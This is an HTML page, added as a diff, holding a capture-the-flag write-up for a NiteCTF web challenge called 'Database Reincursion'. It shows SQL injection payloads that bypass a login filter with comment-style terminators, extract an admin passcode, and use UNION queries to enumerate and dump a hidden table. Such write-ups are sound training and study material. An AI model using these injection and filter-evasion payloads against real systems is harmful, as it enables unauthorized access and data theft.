@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Graph Grief • syndro</title>
+
+  <script>
+    (function() {
+      const saved = localStorage.getItem('theme');
+      const prefersLight = window.matchMedia('(prefers-color-scheme: light)').matches;
+      if (saved === 'light' || (!saved && prefersLight)) document.documentElement.classList.add('light');
+      else document.documentElement.classList.remove('light');
+    })();
+  </script>
+
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Roboto+Mono:wght@300;400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../style.css">
+
+  <style>
+    :root { --accent: #58a6ff; --green: #3fb950; --purple: #8b5cf6; --pink: #f472b6; }
+    .light { --accent: #1f6feb; --green: #238636; }
+
+    body {
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      color: #e6edf3;
+      font-family: 'Roboto Mono', monospace;
+      min-height: 100vh;
+      padding: 40px 20px;
+      line-height: 1.8;
+      transition: background 0.5s, color 0.5s;
+    }
+    .light body { background: #f6f8fa; color: #0d1117; }
+
+    .container { max-width: 1100px; margin: 0 auto; }
+
+    h1 {
+      font-family: 'Orbitron', sans-serif;
+      font-size: 4.8rem;
+      text-align: center;
+      background: linear-gradient(90deg, var(--accent), var(--purple), var(--pink));
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin: 20px 0 10px;
+      text-shadow: 0 0 30px rgba(88,166,255,0.3);
+    }
+    .light h1 { background: linear-gradient(90deg, #1f6feb, #7c3aed, #ec4899); -webkit-background-clip: text; }
+
+    .meta { text-align: center; opacity: 0.85; font-size: 1.2rem; margin-bottom: 60px; }
+    .meta span { color: var(--accent); font-weight: bold; }
+
+    h2 { color: var(--accent); margin: 50px 0 20px; font-family: 'Orbitron', sans-serif; font-size: 2.2rem; }
+
+    p { margin: 20px 0; }
+
+    pre {
+      background: #161b22 !important;
+      color: #f0f6fc !important;
+      padding: 20px;
+      border-radius: 14px;
+      overflow-x: auto;
+      border: 1px solid #30363d;
+      font-size: 1.05rem;
+      margin: 25px 0;
+      white-space: pre-wrap;
+    }
+    .light pre {
+      background: #f6f8fa !important;
+      color: #24292f !important;
+      border: 1px solid #d0d7de !important;
+    }
+
+    code {
+      background: rgba(88,166,255,0.1);
+      padding: 4px 10px;
+      border-radius: 8px;
+      color: var(--green);
+    }
+    .light code { background: rgba(30,110,254,0.15); }
+
+    .container img {
+      display: block;
+      max-width: 100%;
+      border-radius: 16px;
+      margin: 30px auto;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+      border: 2px solid rgba(88,166,255,0.3);
+      cursor: zoom-in !important;
+      transition: all 0.4s ease;
+      user-select: none;
+    }
+    .light .container img { box-shadow: 0 15px 40px rgba(0,0,0,0.15); }
+    .container img:hover {
+      transform: scale(1.03);
+      box-shadow: 0 25px 80px rgba(88,166,255,0.6);
+    }
+
+    .flag {
+      background: rgba(0,255,0,0.1);
+      padding: 30px;
+      border-radius: 16px;
+      font-size: 1.8rem;
+      text-align: center;
+      margin: 60px 0;
+      color: var(--green);
+      font-weight: bold;
+      border: 3px dashed var(--green);
+      font-family: 'Roboto Mono', monospace;
+      letter-spacing: 1px;
+    }
+    .light .flag { background: rgba(35,134,54,0.08); border-color: #238636; }
+
+    .back {
+      position: fixed;
+      top: 30px;
+      left: 30px;
+      background: var(--accent);
+      color: #000;
+      padding: 16px 42px;
+      border-radius: 50px;
+      font-weight: bold;
+      text-decoration: none;
+      box-shadow: 0 12px 40px rgba(88,166,255,0.6);
+      transition: all 0.4s ease;
+      z-index: 9999;
+      font-size: 1.1rem;
+    }
+    .back:hover { transform: translateY(-8px) scale(1.05); box-shadow: 0 20px 60px rgba(88,166,255,0.8); }
+    .light .back { color: white; }
+
+    .theme-toggle {
+      position: fixed;
+      top: 40px;
+      right: 40px;
+      width: 60px;
+      height: 60px;
+      background: var(--surface);
+      border: 2px solid var(--accent);
+      border-radius: 50%;
+      color: var(--accent-light);
+      font-size: 1.8rem;
+      cursor: pointer;
+      z-index: 100;
+      transition: all 0.4s;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .theme-toggle:hover { background: var(--accent); color: #000; }
+    .theme-toggle .moon { display: block; }
+    .theme-toggle .sun { display: none; }
+    .light .theme-toggle .moon { display: none; }
+    .light .theme-toggle .sun { display: block; }
+
+    #imageModal {
+      display: none;
+      position: fixed;
+      z-index: 10000;
+      left: 0; top: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.97);
+      backdrop-filter: blur(16px);
+      align-items: center;
+      justify-content: center;
+      cursor: zoom-out;
+      padding: 20px;
+    }
+    #imageModal.active {
+      display: flex !important;
+    }
+
+    #imageModal img {
+      max-width: 94%;
+      max-height: 94vh;
+      border-radius: 20px;
+      border: 3px solid var(--accent);
+      box-shadow: 0 0 120px rgba(88,166,255,0.8);
+      animation: zoomIn 0.3s ease-out;
+    }
+
+    @keyframes zoomIn {
+      from { transform: scale(0.8); opacity: 0; }
+      to { transform: scale(1); opacity: 1; }
+    }
+
+    .close-modal {
+      position: absolute;
+      top: 30px; right: 40px;
+      font-size: 4.5rem;
+      width: 80px; height: 80px;
+      background: rgba(255,255,255,0.15);
+      color: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    .close-modal:hover {
+      background: rgba(255,255,255,0.3);
+      transform: scale(1.2);
+    }
+
+    @media (max-width: 768px) {
+      h1 { font-size: 3.5rem; }
+      .back { position: static; display: block; margin: 30px auto; width: fit-content; }
+      .close-modal { top: 15px; right: 15px; font-size: 3rem; width: 60px; height: 60px; }
+    }
+  </style>
+</head>
+<body>
+  <a href="https://syndro-1.github.io/page/CTF/Nite2025/Nite2025.html" class="back">Back</a>
+
+  <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+    <span class="sun">☀</span>
+    <span class="moon">☾</span>
+  </button>
+
+  <div class="container">
+    <h1>Database Reincursion</h1>
+    <div class="meta">NiteCTF • <span>Web</span> • syndro</div>
+   
+    <h2>0. Challenge Description</h2>
+    <p>A classic case of intern-level security oversights.</p>
+    <img src="1.png" alt="Description">
+
+    <h2>1. Login Page</h2>
+    <p>Upon accessing the site, we are presented with a login form.</p>
+    <img src="2.png" alt="Login page">
+    <p>A standard SQL injection attempt like <code>' OR 1=1--</code> is immediately blocked by a filter.</p>
+    <img src="3.png" alt="Filter.">
+    <p>After testing several payloads, the following prove effective in bypassing the filter:</p>
+<pre>
+<code>' OR 1=1-- </code> -> Blocked
+<code>' OR 1=1/* </code> -> Blocked
+<code>1' IS NOT '2'/* </code> -> Works
+<code>'|| Username /* </code> -> Works
+</pre>
+    <p>Using either of the last two payloads successfully logs us in.</p>
+
+    <h2>2. Employees Directory</h2>
+    <p>Once inside, we see a search bar for employees along with a field for an Admin Passcode.</p>
+    <img src="4.png" alt="Dashboard">
+    <p>Our objective is clearly to obtain the Admin passcode.</p>
+    <p>A helpful note mentions:</p>
+    <img src="5.png" alt="Hint">
+    <pre>I heard Kiwi from Management has the passcode</pre>
+    <p>Searching for "Kiwi" alone yields no results.</p>
+    <img src="6.png" Alt="kiwi">
+    <p>Since the hint specifies "from Management," we can combine the name with the department using an AND condition.</p>
+    <p>Payload:</p>
+<pre>
+<code>Kiwi' AND Department="Management"/*</code>
+</pre>
+    <p>This reveals the passcode.</p>
+    <img src="7.png" alt="Passcode">
+
+    <h2>3. Admin Panel</h2>
+    <img src="8.png" alt="Admin dashboard">
+    <p>At the bottom of the admin page, there's a "Metadata Registry" listing database tables—one of which is redacted, strongly suggesting it contains the flag.</p>
+    <p>Fortunately, there's also a visible <code>metadata</code> table that lists all tables in the database.</p>
+    <p>We can exploit a UNION-based injection to query this table directly:</p>
+<pre>
+<code>' UNION SELECT * FROM metadata/*</code>   
+</pre>
+    <img src="9.png" Alt="Data tables">
+    <p>This exposes the hidden table name: <code>CITADEL_ARCHIVE_2077</code>.</p>
+    <p>Next, we need to determine the number of columns in the hidden table by testing UNION queries with increasing numbers:</p>
+<pre>
+<code>' UNION SELECT 1 FROM CITADEL_ARCHIVE_2077/*</code> -> Error
+<code>' UNION SELECT 1,2 FROM CITADEL_ARCHIVE_2077/*</code> -> Error
+<code>' UNION SELECT 1,2,3 FROM CITADEL_ARCHIVE_2077/*</code> -> Error
+<code>' UNION SELECT 1,2,3,4 FROM CITADEL_ARCHIVE_2077/*</code> -> Valid
+<code>' UNION SELECT 1,2,3,4,5 FROM CITADEL_ARCHIVE_2077/*</code> -> Error
+</pre>
+    <img src="10.png" Alt="error column number">
+    <img src="11.png" Alt="Correct column number">
+    <p>The table has exactly 4 columns.</p>
+    <p>With the column count confirmed, we can dump the contents using:</p>
+<pre>
+<code>' UNION SELECT *,2,3,4 FROM CITADEL_ARCHIVE_2077/*</code>
+</pre>
+    <img src="12.png" alt="Flag!">
+
+    <div class="flag">
+      nite{neVeR_9Onn4_****}
+    </div>
+    <p>(P.S. The employee names are Cyberpunk references—I both love and hate the author for that.)</p>
+  </div>
+
+  <!-- Image Zoom Modal -->
+  <div id="imageModal">
+    <div class="close-modal">×</div>
+    <img id="modalImage" src="" alt="Zoomed image">
+  </div>
+
+  <script>
+    // Theme toggle
+    document.getElementById('themeToggle')?.addEventListener('click', () => {
+      document.documentElement.classList.toggle('light');
+      localStorage.theme = document.documentElement.classList.contains('light') ? 'light' : 'dark';
+    });
+
+    // Image zoom modal
+    const modal = document.getElementById('imageModal');
+    const modalImg = document.getElementById('modalImage');
+    const closeModalBtn = document.querySelector('#imageModal .close-modal');
+
+    // Open modal on image click
+    document.querySelectorAll('.container img').forEach(img => {
+      img.style.cursor = 'zoom-in';
+      img.onclick = function(e) {
+        e.stopPropagation();
+        modalImg.src = this.src;
+        modal.classList.add('active');
+        document.body.style.overflow = 'hidden';
+      };
+    });
+
+    // Close modal: X button
+    closeModalBtn.onclick = () => {
+      modal.classList.remove('active');
+      document.body.style.overflow = '';
+    };
+
+    // Close modal: background click
+    modal.onclick = (e) => {
+      if (e.target === modal) {
+        modal.classList.remove('active');
+        document.body.style.overflow = '';
+      }
+    };
+
+    // Close modal: Escape key
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && modal.classList.contains('active')) {
+        modal.classList.remove('active');
+        document.body.style.overflow = '';
+      }
+    });
+  </script>
+</body>
+</html>
